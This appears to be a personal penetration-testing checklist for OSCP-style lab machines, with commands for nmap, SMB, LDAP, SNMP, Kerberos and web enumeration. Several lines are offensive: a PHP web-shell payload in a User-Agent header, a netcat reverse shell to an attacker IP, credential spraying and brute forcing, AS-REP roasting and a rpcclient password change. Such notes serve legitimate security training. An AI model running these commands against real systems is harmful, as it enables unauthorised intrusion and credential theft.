**Target IP**
```
192.168.102.227
```
**Local IP** : 192.168.45.202

```
export IP="192.168.102.227"
export URL="http://192.168.102.227:80/FUZZ/"
```

Based on these - https://github.com/intotheewild/OSCP-Checklist/blob/main/03b.%20Windows%20Privilege%20Escalation.md
 
Update the etc/hosts file with the domain name and ip
```
echo "192.168.102.227 bossingit.biz" | sudo tee -a /etc/hosts; cat /etc/hosts
```


# Initial Enumeration

```
sudo autorecon 192.168.102.227 -vv --dirbuster.wordlist /usr/share/wordlists/dirb/common.txt
```
More fopcused with context
```
sudo autorecon 192.168.102.227 -vv --dirbuster.wordlist /usr/share/wordlists/dirb/common.txt --global.username-wordlist ./users.txt --global.password-wordlist ./passwords.txt
```


`mkdir machine && cd machine`
Compile a list of accessible hosts and add it to a `hosts.txt` file.

Run one or more scans on the host:

### nmap 0 without `--open` every time incase there is a filtered top port Although (OSPG DC-9 and port knocking on ssh)

```
sudo nmap -vv -sS -sV -sC --top-ports 5000 -oN nmap_0_report_top5000.nmap 192.168.102.227
```


- [ ]   **Intial Nmap**
```
sudo nmap -p- -vv -sC -sV -O -oN PortFull-Pn.nmap 192.168.102.227 --open
``` 

- [ ]   **Intial Nmap** ignoreing icmp
```
sudo nmap -Pn -p- -vv -sC -sV -O -oN PortFull-Pn.nmap 192.168.102.227 --open
``` 

- [ ] Scan I file of Hosts
```
sudo nmap -iL Hosts.txt -p- -vv -sC -sV -O -oN PortFull-Pn.nmap --open
```

- [ ] Multiple IPS: Can be put in a for loop like :
```
for ip in $(cat Full-IPs.txt); do sudo nmap -p- -sC -sV -O -oN PortFull-Pn.nmap 192.168.102.227 -Pn --open; done
```

```
nmap -p- -sC -sV -oN PortFull.nmap 192.168.102.227 --open
```

```
sudo nmap -p- -Pn -n --open -vvv 192.168.102.227 -oG openPorts
```

```
nmap -p- -sC -sV -oN PortFull.nmap 192.168.102.227 -Pn --open
```

## Netcat Banner Grab and interogation
#### TCP Port Scan
```
nc -nvv -w 1 -z 192.168.102.227 PORT-RANGE
```
```
echo "Hello" | nc -nvv -w 1 -z 192.168.102.227 PORT-RANGE
```
```
echo "GET / HTTP/1.0\r\n\r\n" | nc -nvv -w 1 -z 192.168.102.227 PORT-RANGE
```

#### UDP Port Scan
```
nc -nv -u -z -w 1 192.168.102.227 PORT
```

```
feroxbuster -u http://192.168.102.227 -w /usr/share/wordlists/dirb/common.txt -x txt,php,html,zip -t 100 --rate-limit 150 --redirects --scan-dir-listings -o Feroxx_SCAN.txt
```

```
feroxbuster -u http://192.168.102.227 -x txt,php,html -t 100 --rate-limit 150 --redirects --scan-dir-listings -o Feroxx_SCAN.txt
```


- [ ] UDP nmap scan starter
```
sudo nmap --top-ports=1000 -Pn -sU -oN UDP-top1000.nmap 192.168.102.227 --open
```

```
nikto -C all -h 192.168.102.227
```
#### SMB NMAP
```
nmap -v -p 135,139,445 -oN SMB-nmap.txt -d --script smb-* 192.168.102.227
```

- [ ] **Enum4Linux (even on Windows machines)**
```
enum4linux -A 192.168.102.227 | tee enumforLinux-A-Report.txt   
```
- [ ] Might get a list of user names if we have SMB NULL Sessions
```
enum4linux -U 192.168.102.227  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```

Incursore ?
- [ ] `mkdir incursore && cd incursore` `sudo ~/tools/incursore/incursore.sh -t all -H 192.168.102.227`

- [ ]  **UDP (ask stakeholders)**
```
sudo nmap --top-ports=1000 -vv -Pn -sU -oN UDP-top1000.nmap 192.168.102.227 --open --reason
```



## ⚠️ Discovery
Start with a simple dir search if there is a web page
```
dirsearch -u http://192.168.102.227/ -w /usr/share/wordlists/dirb/common.txt -t 50
```

Post Autorecon go with a larger dir search if there is a web page
```
dirsearch -u http://192.168.102.227/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -t 50
```
----

- [ ]  Intitial dir search with wfuzz
```n
wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 http://192.168.102.227/FUZZ/
```

- [ ]  Intitial dir search with Gobuster
```
gobuster dir -u http://192.168.102.227 -w /usr/share/wfuzz/wordlist/general/common.txt -x txt -t 45 --status-codes-blacklist 400,401,403,404 -o GB-Common-SCAN.txt -q -r 
```
- [ ]  /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```
gobuster dir -u http://192.168.102.227 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x txt,php -t 45 --status-codes-blacklist 400,401,403,404 -o GB-med_php-txt-Dir-.txt -q -r  
```

Fuzz for parameters on a webapp (leave the value `empty` to start, later `true` or `1` or `foo` )
```
wfuzz --hh 851 -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://192.168.102.227/thankyou.php?FUZZ=
```


- [ ]  **Initial Ferox for files**
```
feroxbuster -u http://192.168.102.227:8000 -x php,txt,zip -E -g -t 50 --rate-limit 150 --redirects --scan-dir-listings -C 400,401,403,404 -o Ferox-intitial-SCAN.txt
```
### Try with all these lists 

- [ ] /usr/share/wordlists/dirb/common.txt
- [ ] /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
- [ ] /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
- [ ] /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
- [ ] /usr/share/wordlists/dirb/big.txt
- [ ] wfuzz AuthN header with admin admin
- [ ] /usr/share/wordlists/wfuzz/general/big.txt


```
wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --hw=19 -t 100 -H 'Authorization: Basic YWRtaW46YWRtaW4=' http://192.168.102.227/FUZZ
```

```
wfuzz -H "X-Forwarded-For: 10.10.10.10" --sc 302,200 -u http://192.168.102.227/FUZZ.php -w /usr/share/wordlists/wfuzz/general/big.txt
```

Try to Bypass View Robots.txt as the Google Bot

```
curl -A "GoogleBot" http://192.168.102.227/robots.txt
```


### Look for sub domains

```
dnsenum --dnsserver 192.168.102.227 -f /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -o scans/dnsenum-bitquark-bossingit.biz.HACK bossingit.biz.HACK dnsenum VERSION:1.2.6
```

```
wfuzz -u http://marshalled.pg/ -H "Host: FUZZ.marshalled.pg" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 868
```

**LFI list** ( there are others)
```
wfuzz -c -z file,/usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt,url --hc 404,400 -u "http://192.168.102.227:8080?search=FUZZ"
```

If we browse the app on port 80 and replace the `User-Agent` header with  a php cmd `<?php system($_REQUEST['cmd']);?>`

like :
```
User-Agent: <?php system($_REQUEST['cmd']);?> 
```
Often (but not always) the payload is sent to the `access.log` type file 

## Fuzz For users with Kerbrute
```
kerbrute userenum -d hokkaido-aerospace.com --dc 192.168.102.227 /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -t 100
```

### Contextual
- [ ] Make a costim wordlist with Cewl
```
cewl http://192.168.102.227 | grep -v CeWL > CEWL-custom-wordlist.txt
```

- [ ] Make a contextual wordlist based on cwd scan results - `K:> cttx_wordlist`
- [ ] **Context Dir search with Gobuster**
```
gobuster dir -u http://192.168.102.227 -w ContextWordlist.txt -x txt -t 45 --status-codes-blacklist 400,401,403,404 -o GB-Contextual-SCAN.txt -q -r   
```

- [ ] **Contextual  Feroxfor files**** - ONLY after some digging  `cttx_wordlist`
```
feroxbuster -u http://192.168.102.227 -w ContextWordlist.txt -x txt -E -g -t 50 --rate-limit 150 --redirects --scan-dir-listings -C 400,401,403,404 -o Ferox-Contextual-SCAN.txt
```

- [ ]  **Web to markdown** -- get soem contextual data
```
curl -s http://192.168.102.227/error | html2markdown | tee -a InteresteingWebpageData.txt 
```

**Specific port open Discovery**
```
nmap -v -p 88 -oN krb-nmap.txt --script krb5-* 192.168.102.227 --open
```
- [ ] `nmap -v -p 88 -oN Kerb-nmap.txt --script krb5-enum-users 192.168.102.227 --open`
- [ ] `sudo nmap -sV -p 389,636,3268,3269 192.168.102.227 --script "ldap* and not brute" -oN ldap-scripts-nmap.txt`
- [ ] `sudo nmap -sU -p 161 192.168.102.227 --script "snmp* and not brute" -oN snmp-scripts-udp-161-nmap.txt`
- [ ] `ldapsearch -x -H ldap://192.168.102.227 -D 'nagoya.nagoya-industries.com' -b 'DC=nagoya-industries,DC=com'`
- [ ] `nmap -v -p 593,49664,49665,49666,49667,49668,49669,49670,49671,49672,49673,49674 -oN msrpc-enum-nmap.txt --script msrpc-enum 192.168.102.227 --open`

---
# Information to Note 

Review the completed scans and mark down any notable information in your spreadsheet:
- [ ] Operating Systems
- [ ] Hostnames
- [ ] Open Ports
- [ ] Service Versions
- [ ] Check Anonymous or Guest access on all service protocols 
- [ ] Random port with no info? try `nc IP PORT` or `echo "version" | nc 192.168.102.227 PORT`


---
### Additional Service Enumeration
Quick links to information by service:

| Service                                                                                                        | Service                                                                                                     | Service                                                                                            |
| -------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------- |
| [21 - FTP](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-ftp/index.html)              | [22 - SSH](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-ssh.html)                 | [23 - TELNET](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-telnet.html)  |
| [25 - SMTP](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-smtp/index.html)            | [53 - DNS](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-dns.html)                 | [80 - WEB](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/index.html)  |
| [88 - KERBEROS](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-kerberos-88/index.html) | [111 - NFS](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-rpcbind.html)            | [135 - RPC](https://book.hacktricks.wiki/en/network-services-pentesting/135-pentesting-msrpc.html) |
| [139 & 445 - SMB](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-smb/index.html)       | [161 - SNMP](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-snmp/index.html)        | [389 - LDAP](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-ldap.html)     |
| [3389 - RDP](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-rdp.html)                  | [5985 - WINRM](https://book.hacktricks.wiki/en/network-services-pentesting/5985-5986-pentesting-winrm.html) | [[SQL DBs]]                                                                                        |
- [Checklists other than hacktricks](https://github.com/ByteSnipers/awesome-pentest-cheat-sheets) 


### Spray Crededntials


( **REMEMBER!!** to also try nxc with `--local-auth` otherwise it defaults to authN at the Domain level)
- [ ] spay on smb - 
```
nxc smb 192.168.102.227 -u users.txt  -p passwords.txt --continue-on-success --local-auth
```
- [ ] spray creds on ldap
- [ ] spray creds on ssh
- [ ] spray creds on rdp
- [ ] spray creds on mssql
- [ ] **ALWAYS** try spray with evil-winrm as well as winrm becasue its just different from nxc
```
evil-winrm 192.168.102.227 -u USERNAME  -p PASSWORD
```



---
## What to look for
- [ ] Look at the service version of ports and see if there is any low-hanging fruit or public exploits
- [ ] If nothing easy is found, look deeper into the services (FTP,SMB,NFS,SMTP,WEB)
- [ ] Check if there's a way to [upload files](https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html?highlight=file%20upload#file-upload) to create a [revere shell](revshells.com/) from different options here.
	- [ ] Can we modify the `.htaccess` file for our own extension
- [ ] Check if there's a way to read sensitive information
- [ ] Check if there's any files that give contextual hints or point towards a vulnerable service running on an unknown port
- [ ] Open each service note and dig deep starting with FTP, SNMP, SMB, HTTP

---
### [[21 - FTP]]

```
sudo nmap -sV -p 21 192.168.102.227 --script "ftp* and not brute" -oN ftp-nmap.txt
```

- [ ] Check version using `searchsploit` for public exploits

- [ ] Check for `anonymous` login 

- [ ] Try with `admin:admin`  - Offsec Authby

- [ ] Try with `ftp:ftp`  - Offsec exam

- [ ] Get a better connection by loging in with the domain name eg : `ftp anonymous@osaka` - This was much better

- [ ] Check for hints within the directory (i.e. `minniemouse.exe`)

- [ ] Download the directory `wget -q -m ftp://anonymous:anonymous@192.168.102.227:30021 -P FTP-Dump`

- [ ] Check if there's anything that points towards uploads going to the web directory

- [ ] Check if  we upload ?
	- [ ] IF so , can we find if from the front?

- [ ] `openssl s_client -connect 192.168.102.227:21 -starttls ftp` - Get cirt if there is one

- [ ]Try anon with random password
```
ftp anonymous@192.168.102.227 21 
```
This also might work without a password (Offsec Potato )
```
lftp -p 21 -u anonymous, ftp://192.168.102.227
```
---

### [22 ssh]

See hacktricks links

`ssl-heartbleed.nse`

```
nmap --script-help ssh-brute
```

```
less /usr/share/nmap/scripts/ssh-brute.nse
```

```
nmap --script ssh-brute -p22 192.168.102.227 -oN sshBrute.nmap
```

---


### 25 SMTP

`VRFY` command tells if an email address exists.

`EXPN` command shows membership of mailing list

Keep in mind, if you have any exploits for this service, you may need a valid email address as a `RCPT`.


If you get shell look though

```
cat /var/mail/*
```
If you get shell look though
```
cat /var/spool/mail/*
```



---

### [[53 DNS]]

DNS Enumeration might give you information on other hosts in the network.
Keep in mind, you will probably have to mess with /etc/conf for this!!!

If you are looking for DNS servers specifically, use nmap to quickly and easily search:
```
nmap -sU -p53 ​[NETWORK]
```

Normal DNS Query:
```
nslookup ​192.168.102.227
```

Query for MX Servers within a domain:
```
dig bossingit.biz ​MX
```

Query for Name Servers within a domain:
```
dig bossingit.biz ​NS
```

DNS Zone Transfer (This will give you all of the marbles!)
```
dig axfr @​[NAMESERVER] bossingit.biz
```
```
dnsrecon -d ​domain ​-a --name_server ​server
```

If you want to brute force subdomain enum, try dnsmap:
```
dnsmap ​domain
```
---
### [[TFTP 69 (UDP)]]

**TFTP** (Trivial File Transfer Protocol). Is a simple, unauthenticated UDP file-transfer service (usually port 69). Attackers care because it often exposes readable/writable files—like configs, backups, or firmware—leaking credentials and enabling malicious file uploads for footholds.


1. Enum tftp with nmap
```
nmap -n -Pn -sU -p69 -sV --script tftp-enum 192.168.102.227
```
and it comes back with something liek 
```
PORT   STATE SERVICE VERSION
69/udp open  tftp    Netkit tftpd or atftpd
| tftp-enum: 
|   backup.cfg
|   sip-confg
|   sip.cfg
|_  sip_327.cfg

```

You cna then download the files like :

```
tftp 192.168.102.227 -c get backup.cfg
```

---

### [[80 - WEB]]
- [ ] if nothing : Try `index.php` , `index.html etc`
- [ ] Try `POST` for a `GET` and set `Content-Length: 0`:
  - [ ]  `curl -s -i -X POST -H 'Content-Length: 0' http://192.168.102.227:33333/list-running-procs?`
- [ ] Check version using `searchsploit` for public exploits (Traversal, SQLi, RCE)
- [ ] Check to see if anything else is running using `whatweb http://192.168.102.227` (searchsploit, wordpress)
- [ ] Fully enumerate with directory brute-forcing
* Run multiple tools and check for file extensions, try from deeper directories
- [ ] Visit site in the browser and look for any context clues
* See if there's any hint for FQDN and put it in `/etc/hosts`
* See if there's any hints to valid users or software in pages or source code
- [ ] Test everything for default credentials or username being the password
- [ ] Start by **identifying** the **technologies** used by the web server. Look for **tricks** to keep in mind during the rest of the test if you can successfully identify the tech.
    - [ ]  Any **known vulnerability** of the version of the technology?
    - [ ]  Using any **well known tech**? Any **useful trick** to extract more information?
    - [ ]  Any **specialised scanner** to run (like wpscan)?
- [ ]  Launch **general purposes scanners**. You never know if they are going to find something or if the are going to find some interesting information.
- [ ]  Start with the **initial checks**: **robots**, **sitemap**, **404** error and **SSL/TLS scan** (if HTTPS).
- [ ]  Start **spidering** the web page: It's time to **find** all the possible **files, folders** and **parameters being used.** Also, check for **special findings**.
    - [ ]  _Note that anytime a new directory is discovered during brute-forcing or spidering, it should be spidered._
- [ ]  **Directory Brute-Forcing**: Try to brute force all the discovered folders searching for new **files** and **directories**.
    - [ ]  _Note that anytime a new directory is discovered during brute-forcing or spidering, it should be Brute-Forced._
- [ ]  **Backups checking**: Test if you can find **backups** of **discovered files** appending common backup extensions.
- [ ]  **Brute-Force parameters**: Try to **find hidden parameters**.
- [ ]  Once you have **identified** all the possible **endpoints** accepting **user input**, check for all kind of **vulnerabilities** related to it.


### Command injection
Starting Payloads - https://github.com/payloadbox/command-injection-payload-list
```
ffuf -u http://192.168.102.227/under_construction/forgot.php?email=FUZZ -w Unix-CMD.txt --enc auto -mr "uid="
```

- CVE-2023-40582 (find-exec)
```
; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.200 4444 >/tmp/f
```

### 88 Kerberos


ADD THE DNS NAME TO YOUR etc/hosts FILE!!!

#ENUMERATE ACCOUNTS ON DC
```
kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt
```

#### Check for users on 445 with RPC
(`-N` drop prompt for password)
```
rpcclient -U "" -N 192.168.102.227
```
`enumdomusers`
`querygroup 0x200`  
`querygroupmem 0x200`
`queryuser 0x1f4` 



To use Kerberos as Auth
```
impacket-getTGT DOAMIN/USERNAME:PASSWORD -dc-ip 192.168.102.227
```

```
export KRB5CCNAME=<TICKET_PATH>.ccache
```

```
nxc smb 192.168.102.227 --use-kcache
```

```
nxc ldap 192.168.102.227 --use-kcache
```



**Enum for users**
```
kerbrute userenum -d Doamin-name.com --dc 192.168.102.227 /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -t 100
```




### PHP
- [ ] Is phpinfo.php revealed?
	- [ ] What does it list as the web root **`DOCUMENT_ROOT`**?
	- [ ] 
	- [ ] Are any usernames revealed in the path section
	- [ ] Does the document root say where things are being installed on the machine?
		- [ ] useful for [LFI](https://github.com/roughiz/lfito_rce) via phpinfo.php
	- [ ] Does `Disable_functions` have list anything asa disabled we wont be able to use?
##### wordpress - wpprobe (tool just fro plugins)

Update the tools
```
wpprobe update
```

Update the db
```
wpprobe update-db
```

```
wpprobe scan -u http://workaholic.offsec 
```
Fast and in go

OSCP Jewles Wordpress - https://github.com/jephk9/oscp-jewels/blob/main/services/wordpress-plugin-exploits.md

#### WP-SCAN
 -  [x] MIGHT NEED AN Update first `wpscan --url http://192.168.102.227

- Most pasic wp-scan
```
wpscan --url http://192.168.102.227/ --enumerate ap,at,cb,dbe
```  


- [ ] Basic Wp scan
```
wpscan --url http://192.168.102.227 --disable-tls-checks --random-user-agent -e ap,at,u --plugins-detection aggressive -t 20 --rua | tee WpScanOUTPUT.txt 
```
- [ ] Faster Wp scan with Api key 
```
wpscan --url http://192.168.102.227 --enumerate u,ap,at,tt,cb,dbe --plugins-detection aggressive -o WPscanReport.txt --api-token <API_TOKEN>
```
---


### 111 NFSw


Useful nmap scripts:
rpc-info
nfs-ls
nfs-showmount
nfs-statfs




### [138 & 139 & 445 - SMB](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-smb/index.html)
- [ ] Check anonymous listing 
```
smbclient -N -L \\\\192.168.102.227\\
```
- [ ] Try with an empty user and any password eg "Vault"
```
smbclient -L \\\\192.168.102.227\\ -U '' 
```

- [ ] or empty creds with Impacket
```
impacket-smbclient "":''@192.168.102.227
```

```
smbclient \\\\192.168.102.227\\SomeShare -U 'guest'
```

```
smbclient -N -L \\\\192.168.102.227\\
```
- [ ] Check giving empty password or `username` as password
```
smbclient \\\\192.168.102.227\\
```
```
smbclient //192.168.102.227/_SHARE_$ -N --option='client min protocol=SMB2'
```
```
smbclient //192.168.102.227/_SHARE_$ -N -c "prompt OFF; recurse ON; mget *"
```
If you have creds or this is a little more forgiving on your connection

```
impacket-smbclient  USERNAME'PASWWORD'@192.168.102.227
```

- [ ] List out the modules you could use `-L` (same for all protcols)
```
nxc smb 192.168.102.227 -L
```

Even on a Null session this might fruit users
```
nxc smb 192.168.102.227 --users 
```

it's always a good idea to check the **SYSVOL** share toooo .
```
nxc smb 192.168.102.227 --shares 
```

Even try this 
```
smbclient.py SKYLARK.com/backup_service:It4Server@192.168.102.227 
```

##### Also if you have some creds and they don't work remeber to use Kerberoast with **-k**
```
nxc smb bossingit.biz.local -u 'Alice' -p 'passw0rd123' -k --users 
```


Might be able to BF uNames via rid-brute
```
nxc smb 192.168.102.227 -u 'guest' -p '' --rid-brute
``` 

We can then take the usernames and BRuteforce on AS-REProast ( this is nte beset wauy I know for this at momment ( better then all other tools))
```
for user in $(cat usernames.txt); do impacket-GetNPUsers -no-pass -dc-ip 192.168.102.227 blackfield.local/$user | grep krb5asrep; done
```


```
nxc smb 192.168.102.227 -u '' -p '' -M spider_plus
```

**Full Spider Plus**
```
nxc smb 192.168.102.227 -u 'jim' -p 'Castello1!' -M spider_plus -o OUTPUT_FOLDER=./spider_out
```
**Cat or Code the output**
```
cat spider_out/192.168.102.227.json  
```


**Cleaner/quicker/shallower spiderplus**
```
nxc smb 192.168.102.227 -u USERNAME -p 'PASSWORD' -M spider_plus -o EXCLUDE_FILTER='print$,NETLOGON,SYSVOL,ipc$' 
```
```
cat List_of_File_SPIDER_PLUS.json | jq '.| map_values(keys)'
```

```
nxc smb 192.168.102.227 --pass-pol
```
**nxc protocols:** {smb,ftp,rdp,ssh,wmi,winrm,mssql,vnc,ldap}
- [ ] Force the smbexec method
	- [ ] `nxc smb 192.168.102.227 -u 'Administrator' -p 'PASS' -x 'net user Administrator /domain' --exec-method smbexec`
- [ ]  Execute commands through PowerShell (admin privileges required)
	- [ ] `nxc smb 192.168.102.227 -u Administrator -p 'P@ssw0rd' -X 'whoami'`

```
nxc smb 192.168.102.227 -u '' -p '' -x 'ping.exe -n 3 192.168.102.227'  
```

- [ ] Can we upload a text, binary shell, or link file ([lnkbomb](https://github.com/dievus/lnkbomb)) ?

```
python3 /home/kali/Tools/hashgrab/hashgrab.py 192.168.45.202 PleaseClickMe   
```

To probe NetBIOS info:
```
nbtscan -v ​192.168.102.227
```
-The hex codes reference different services.  You can look up what they mean, but 20 means File Sharing services.
-http://www.pyeung.com/pages/microsoft/winnt/netbioscodes.html

To list what resources are being shared on a system:
```
smbclient -L ​192.168.102.227
```

To display share information on a system:
```
nmblookup -A ​192.168.102.227
```

Enum4linux is a great tool to gather information through SMB (note, it tests anonymous login only by default)
```
enum4linux ​192.168.102.227
```

If you want to brute force, you can try nmap scripts, but I personally like using Hydra for this:
You can experiment with different wordlists, but in an ideal situation, you'll have at least the user.  Otherwise this will take forever!!!!
```
hydra -l [USER] -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt smb://192.168.102.227/ -V -I   
```

```
hydra -l root -P /usr/share/seclists/Passwords/Common-Credentials/darkweb2017_top-1000.txt 192.168.102.227 mysql -v
```

SambaCry and EternalBlue might be there
```
nmap --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version -p445 192.168.102.227 -Pn
```


```
smbmap -u anonymous -p anonymous -H ​192.168.102.227
```


```
smbmap -u anonymous -p anonymous -H ​192.168.102.227 -R Some_Share
```

```
smbmap -u anonymous -p anonymous -H 10.10.10.233 --download Some_Share\Somefile
```


### [[161 - SNMP]]



- Enumerate community strings on v1 and v2
- `sudo nmap -sU -p 161 --script snmp-brute 192.168.102.227`
- Try to get useful information from accessible communities
- `snmpwalk -v 1 -c public 192.168.102.227 NET-SNMP-EXTEND-MIB::nsExtendObjects`
- `snmpwalk -v2c -c public 192.168.102.227 | grep <string>`


Try for usernames
```
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t 192.168.102.227
```


```
snmp-check 192.168.102.227
```

Walks vendor-specific SNMP data under the enterprise OID tree, starting at 1.3.6.1.4.1, where custom MIBs live. This gave passwords on Frankfurt. Not done by AutoRecon ( why ?? , could i modify)
```
snmpwalk -v2c -c public 192.168.102.227 1.3.6.1.4.1 | tee snmpWalk.OUT
```


More nmap scripts
```
snmp-brute * (I've had some difficulties with it, try hydra or something else too)
smtp-brute
smtp-commands
smtp-enum-users
```
Get nmap help
```
nmap --script-help smtp-commands
```
Even deeper 

```
/usr/share/nmap/scripts/smtp-commands.nse
```

---


The thing about SNMP is that it operates using community strings.  It's a fancy ass way of saying it sends passwords when it sends data.
-SNMPv1 is all cleartext, so it is easy to grab the string
-SNMPv2 has some inherent weaknesses allowing it to be grabbed 2
-SNMPv3 is encrypted, but it can be brute forced.

There are 2 kinds of community strings: Public and Private.
Public - Read Access
Private - Write Access

You can use wireshark to sniff for SNMP traffic for SNMPv1 and 2.

You can also brute-force the string with nmap or Hydra:
```
nmap --script=snmp-brute 192.168.102.227
```
```
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt snmp://192.168.102.227/
```

Once you have the community string through whatever method, you can then start to grab information from it.
snmpwalk -c ​[COMMUNITY_STRING] ​-v ​[SNMP_VERSION] 192.168.102.227

If you know what OID you are looking for, you can actually search for specific parameters:
snmpwalk -c ​[COMMUNITY_STRING] ​-v ​{SNMP_VERSION] 192.168.102.227 [OID]

```
| 1.3.6.1.2.1.25.1.6.0 | System Processes |
| 1.3.6.1.2.1.25.4.2.1.2 | Running Programs |
| 1.3.6.1.2.1.25.4.2.1.4 | Processes Path |
| 1.3.6.1.2.1.25.2.3.1.4 | Storage Units |
| 1.3.6.1.2.1.25.6.3.1.2 | Software Name |
| 1.3.6.1.4.1.77.1.2.25 | User Accounts |
| 1.3.6.1.2.1.6.13.1.3 | TCP Local Ports |
```


Honestly, I recommend just using snmpenum to gather info:
```
snmpenum 192.168.102.227 [COMMUNITY STRING] [CONFIG FILE]
```
-config files are in /usr/share/snmpenum/

You can even overwrite and set some OIDs if things are misconfigured:

```
snmpset -c {COMMUNITY_STRING] -v {SNMP_VERSION] [OID] [VALUE]
```

Useful Nmap Scripts:
```
snmp-brute
snmp-win32-services.nse
snmp-win32-shares.nse
snmp-win32-software.nse
snmp-win32-users.nse
```

Userful OIDs (Windows)
```
1.3.6.1.2.1.25.1.6.0  System Processes 
1.3.6.1.2.1.25.4.2.1.2  Running Programs
1.3.6.1.2.1.25.4.2.1.4  Processes Path 
1.3.6.1.2.1.25.2.3.1.4  Storage Units 
1.3.6.1.2.1.25.6.3.1.2  Software Name 
1.3.6.1.4.1.77.1.2.25  User Accounts 
1.3.6.1.2.1.6.13.1.3  TCP Local Ports
```



### [135 - RPC](https://book.hacktricks.wiki/en/network-services-pentesting/135-pentesting-msrpc.html)

```
rpcclient -U '' -N 192.168.102.227
```

- [ ] [Good Starter article](https://www.hackingarticles.in/active-directory-enumeration-rpcclient/) of enum with `rpcclient` 
- [ ] Hacktricks page [rpcclient](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-smb/rpcclient-enumeration.html?highlight=rpcclient#enumeration-with-rpcclient)

```
querydispinfo, enumdomusers, queryuser, enumlsgroups builtin, enumdomgroups, setuserinfo, chgpasswd, querygroup <GROUP_RID>
```

**RPC Queries**
`srvinfo`                     -  Get server OS and domain info
`enumdomusers`                -  List all domain users
`enumpriv`                    -  Show current user’s privileges
`queryuser john`              -  Get info on user "john"
`getusrdompwinfo <RID>`       -  Fetch domain password policy by user's RID
`lookupnames john`            -  Get SID for user "john"
`createdomuser john`          -  Add user "john" to the domain
`deletedomuser john`          -  Remove user "john" from the domain
`enumdomains`                 -  List accessible domains
`enumdomgroups`               -  List all domain groups
`querygroup <group-RID>`      -  Get details on a group by RID
`querydispinfo`               -  Describe all domain users
`netshareenum`                -  List shared resources (user permission needed)
`netshareenumall`             -  List all shared resources (all access)
`lsaenumsid`                  -  List all user SIDs on the system


- [ ] Get user name info from a null session
```
rpcclient -W '' -c querydispinfo -U''%'' '192.168.102.227' | tee rpc_userinfo.txt
```
- [ ] Check again with discovered credentials and the username in this kind of format
```
rpcclient -U nagoya-industries.com/svc_helpdesk 192.168.102.227
```
 - [ ] Can we change a users password ( with creds and if permitted) - setuserinfo2 is safer
```
rpcclient $> setuserinfo2 USERNAME 23 Tuesday@2
```
- [ ] Look up the SID for an administrator
```
rpcclient $> lookupnames administrator@sub.domain.com
```
- [ ] Look up a particualr Groups SID value
```
rpcclient $> lookupnames "Enterprise Admins"
```
## [Webdav](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/put-method-webdav.html?highlight=webdav#webdav) - 80/443 

**(Web Distributed Authoring and Versioning)**

- [ ] If we have some creds can we login with [cadaver](https://github.com/notroj/cadaver?tab=readme-ov-file)
```
cadaver http://192.168.102.227
```
- [ ] Can we upoload files?
    - [ ] Can we upload shell?  `/usr/share/webshells/aspx/ws.aspx`
	- [ ] `/usr/share/webshells/aspx/cmdasp.aspx`
---
- [ ] Looking for passwords in found files
```
grep -rinE '(password|username|user|pass|key|token|secret|admin|login|credentials)'
```
----


## [389 - LDAP](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-ldap.html)

- **389/tcp** – LDAP – `Standard LDAP` for the local domain (normal directory queries to the DC).
- **636/tcp** – LDAPS – LDAP over SSL/TLS (encrypted version of 389).
- **3268/tcp** – LDAP (GC) – `Global Catalog` over LDAP (searches across the whole forest, partial attributes).
- **3269/tcp** – LDAPS (GC) – `Global Catalog` over SSL/TLS (encrypted version of 3268).


- [ ]  Nmap ldap 

```
nmap -v -p 389,636,3268,3269 -oN LDap-Nmap.txt -d --script "ldap* and not brute" 192.168.102.227
```
- [ ] Get user details ( unauthenticated) - [Windapsearch](https://github.com/ropnop/go-windapsearch?tab=readme-ov-file)

```
windapsearch --dc 192.168.102.227 --domain hutch.offsec -m users --full | tee Windap_Users_Search.txt
```
or with `ldapsearch` get the user info

```
ldapsearch -x -H ldap://192.168.102.227 -b "DC=hutch,DC=offsec" "(objectClass=user)" 
```

...or just the description, or perhaps
```
ldapsearch -x -H ldap://192.168.102.227 -b "DC=hutch,DC=offsec" "(objectClass=user)" description
```


- [ ] The phone book of Active Directory 
```
ldapsearch -H ldaps://nagoya-industries.com:636/ -x -s base -b '' "(objectClass=*)" "*" +
```

- [ ] check if there is any data open and exposed 
```
